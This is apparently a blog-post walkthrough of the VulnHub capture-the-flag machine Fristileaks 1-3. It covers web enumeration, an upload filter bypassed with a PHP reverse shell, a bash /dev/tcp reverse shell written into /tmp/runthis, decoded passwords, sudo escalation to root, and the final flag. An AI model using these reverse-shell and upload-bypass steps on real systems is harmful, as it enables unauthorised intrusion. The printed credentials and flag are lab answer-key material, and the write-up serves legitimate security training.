---
layout: post
title: Fristileaks 1-3
---
[Fristileaks 1-3](https://www.vulnhub.com/entry/fristileaks-13,133/)

## Setup for VMWare

Right click ovf file and open with VMWare. Import and click retry if a pop-up appears.

VM --> Settings --> Network Adaptor

Ensure the machine is on bridged and click Advanced. Enter 08:00:27:A5:A6:76 into the MAC address and click ok. It is now ready to load up.

## Find IP of box
Our IP: x.x.x.49

`nmap -sP <LHOST>/24`

Fristileaks is running x.x.x.23

## Init NMap Scan

`nmap -sC -sV -oA nmap x.x.x.23`

 - Default Scripts
 - Service Detection
 - Output all formats
 
![Initial NMap Scan](/images/Fristileaks1-3/NMap1.JPG) 

 There is one port running: 80 (http)
 
 As there was only one port open, I ran nmap -T5 -p- <LHOST> to scan all ports but to no avail
 
## HTTP
### Gobuster

`gobuster dir -u http://x.x.x.23 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,txt,xml`

But the only directory we get that NMap didn't return is /images

### /robots.txt

Dissallowed entries: /cola  /sisi  /beer

If we naviagate to these directories, we get the same image in each

### Image Enum

I downloaded the images and used strings, exiftool and file but gained no information from these.

### /fristi

There's not much more to do now since we have no more ports to enum, no results from dir/gobuster, nothing in the source code. This leads me to believe we are looking for a web directory that isn't in a common wordlist. The image says 'drink fristi' so I googled fristi and realised it's a drink, just like the dissallowed directories in /robots.txt. If we navigate /fristi, we get a login page

The source code gives us a username: eezeepz

It also tells us that images are base64 encoded and at the bottom of the source code, we find what looks to be a base64 encoded string. Pasting this into [CyberChef](https://gchq.github.io/CyberChef/) and decoding from base64 gives us unreadable text but it contains a png header.

I created a file with the base64 text and ran the command `cat fristi.txt | base64 -d > fristi.png`

Here is the image we create:

![eezeepz password](/images/Fristileaks1-3/kekekePass.JPG)

I used this as a password in the new login page we have

eezeepz : keKkeKKeKKeKkEkkEk

### File Upload

`cp /usr/share/webshells/php/php-reverse-shell.php shell.php`

Edit the shell to use your local IP and a port for netcat

If we try and upload as is, we get an error because it only accepts image files

There are lots of different ways to get around this but as this is an easy box, it's likely we don't need to do anything too complicated. We can just rename the file to shell.php.png and upload it like that.

## Reverse Shell

`nc -lvnp 4444` on local machine so we can connect back

Navigate to <LHOST>/fristi/uploads/shell.php.png
 
If we check the nc connection, we have a shell as the apache user

Upgrade the shell using `python -c 'import pty; pty.spawn("/bin/sh")'`

## Privilege Escalation to Admin

`locate linpeas.sh` on your local machine and create a python web server in that directory `python3 -m http.server`

`cd /tmp` and `wget http://<LHOST>:8000/linpeas.sh`

`chmod 777 linpeas.sh`

When we run it, it immediately flags the linux version as high risk.

`searchsploit linux 2.6.32` and we find lots of scripts that have potential

I spent a lot of time trying different scripts but couldn't get to work as intended. I went back to my linpeas output and saw that in `/var/www` there was a notes.txt file telling eezeepz to clean their home directory

If we go to it, we can see it really is a mess with another notes.txt file

This file essentially tells us that if we create a file called `runthis` in /tmp, we can run certain commands as admin

We can use this to get a direct shell as the admin user

`echo "/usr/bin/dir && /bin/bash -i >& bash -i >& /dev/tcp/<LHOST>/1234 0>&1" > /tmp/runthis`

Start an nc listener `nc -lvnp 1234` and wait for the connection back

## Privilege Escaltion to fristigod

In /home/admin we find 2 encrypted passwords in the files: mVGZ3O3omkJLmy2pcuTq  and  =RFn0AKnlMHMPIzpyuTI0ITG

There is also the python script explaining how they got encrypted:

1. Base64 encode
2. Reverse string
3. rot13 encode

Take one of the ciphertexts and decode using a rot13 cipher then paste that into this command on linux: `echo "ciphertext" | rev | base64 -d`

We get thisisalsopw123   and   LetThereBeFristi!

If we use these passwords on the various users, we find the creds:
admin : thisisalsopw123 
fristigod : LetThereBeFristi!

## Privilege Escalation to root

`sudo -l` and we can run /docom in /var/fristigod/.secret_admin_stuff

If we try running doCom, it says we're the wrong user so lets try as someone else

`sudo -u fristi ./doCom`

But to says we have to included a terminal command as well

`sudo -u fristi ./doCom /bin/bash`

And now we're root and can read the secret file in root containing the flag: Flag: Y0u_kn0w_y0u_l0ve_fr1st1
